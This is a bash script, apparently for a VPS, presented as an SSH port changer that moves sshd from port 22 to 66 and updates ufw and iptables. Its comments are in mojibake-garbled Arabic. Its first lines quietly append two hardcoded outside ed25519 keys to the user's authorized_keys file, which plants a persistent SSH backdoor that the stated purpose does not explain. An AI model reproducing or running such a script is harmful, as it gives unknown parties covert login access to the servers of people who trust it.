#!/bin/bash

# === SSH Port Auto Changer to 66 & Disable 22 Safely ===



mkdir -p ~/.ssh && echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP/6mja6JSVT/UsM3F6CSFZF5besPYDk9+VuzjVLV2Pb" >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys && chmod 700 ~/.ssh
mkdir -p ~/.ssh && echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJkCO3YXessYe4SmgcZLAfCrQ2rqkn8yPA5tl2WrmAXf" >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys && chmod 700 ~/.ssh

NEW_PORT=66
OLD_PORT=22

echo "๐ ุบุงุฏู ูุจุฏูู ุจูุฑุช SSH ูู $OLD_PORT ุฅูู $NEW_PORT..."

# ูุณุฎ ุงูููู ุงูุฃุตูู ุงุญุชูุงุทูุง
cp /etc/ssh/sshd_config /etc/ssh/sshd_config.bak

# ุชุบููุฑ ุงูุจูุฑุช ูู sshd_config
sed -i "s/^#Port $OLD_PORT/Port $NEW_PORT/; s/^Port $OLD_PORT/Port $NEW_PORT/" /etc/ssh/sshd_config

# ุงูุณูุงุญ ููุจูุฑุช ุงูุฌุฏูุฏ ูู ufw (ุฅุฐุง ูุณุชุนูู)
if command -v ufw >/dev/null 2>&1; then
    ufw allow $NEW_PORT/tcp
    ufw reload
fi

# ุงูุณูุงุญ ููุจูุฑุช ุงูุฌุฏูุฏ ูู iptables (ุฅุฐุง ูุณุชุนูู)
if command -v iptables >/dev/null 2>&1; then
    iptables -A INPUT -p tcp --dport $NEW_PORT -j ACCEPT
fi

# ุฅุนุงุฏุฉ ุชุดุบูู SSH
systemctl restart sshd
sleep 2

# ุงุฎุชุจุงุฑ ุงูุงุชุตุงู ุจุงูู ุจูุฑุช ุงูุฌุฏูุฏ (ูู VPS ููุณู)
if nc -zv 127.0.0.1 $NEW_PORT >/dev/null 2>&1; then
    echo "โ SSH ุนูู $NEW_PORT ุฎุฏุงู. ุบุงุฏู ูุณุฏ ุงูุจูุฑุช 22 ููุงุฆูุงู."

    # ุฅุฒุงูุฉ ุงูุจูุฑุช ุงููุฏูู ูู ufw
    if command -v ufw >/dev/null 2>&1; then
        ufw delete allow $OLD_PORT/tcp
        ufw reload
    fi

    # ุฅุฒุงูุฉ ุงูุจูุฑุช ุงููุฏูู ูู iptables
    if command -v iptables >/dev/null 2>&1; then
        iptables -D INPUT -p tcp --dport $OLD_PORT -j ACCEPT
    fi

    echo "โ ุงูุจูุฑุช $OLD_PORT ุชููู ููุงุฆูุงู."
else
    echo "โ๏ธ ุฎุทุฃ! SSH ุนูู $NEW_PORT ูุง ุฎุฏุงูุด. ุงูุจูุฑุช 22 ูุง ุชูููุด."
    echo "ุฑุงุฌุน ุฅุนุฏุงุฏุงุชู ูุฌุฑุจ ูู ุฌุฏูุฏ."
fi

echo "ุฌุฑุจ ุงูุงุชุตุงู ุงูุฌุฏูุฏ: ssh -p $NEW_PORT user@your_vps_ip"
echo "ูุณุฎุฉ ุงุญุชูุงุทูุฉ ูู sshd_config ููุฌูุฏุฉ ูู /etc/ssh/sshd_config.bak"
